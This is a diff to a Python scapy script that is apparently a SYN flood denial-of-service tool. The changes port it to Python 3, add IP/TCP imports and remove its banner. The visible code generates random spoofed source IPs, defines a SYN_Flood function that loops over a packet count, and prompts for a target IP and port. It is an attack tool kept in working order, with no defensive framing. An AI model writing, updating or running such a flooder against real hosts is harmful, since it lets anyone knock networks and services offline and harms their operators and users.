@@ -2,6 +2,7 @@ from scapy.all import *
 import os
 import sys
 import random
+from scapy.layers.inet import IP, TCP
 
 def randomIP():
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
@@ -13,7 +14,6 @@ def randInt():
 
 def SYN_Flood(dstIP,dstPort,counter):
 	total = 0
-	print "Packets are sending ..."
 	for x in range (0,counter):
 		s_port = randInt()
 		s_eq = randInt()
@@ -37,13 +37,8 @@ def SYN_Flood(dstIP,dstPort,counter):
 
 def info():
 	os.system("clear")
-	print "#############################"
-	print "#    github.com/EmreOvunc   #"
-	print "#############################"
-	print "# Welcome to SYN Flood Tool #"
-	print "#############################"
-	dstIP = raw_input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
+	dstIP = input("\nTarget IP : ")
+	dstPort = input("Target Port : ")
 	
 	return dstIP,int(dstPort)
 	
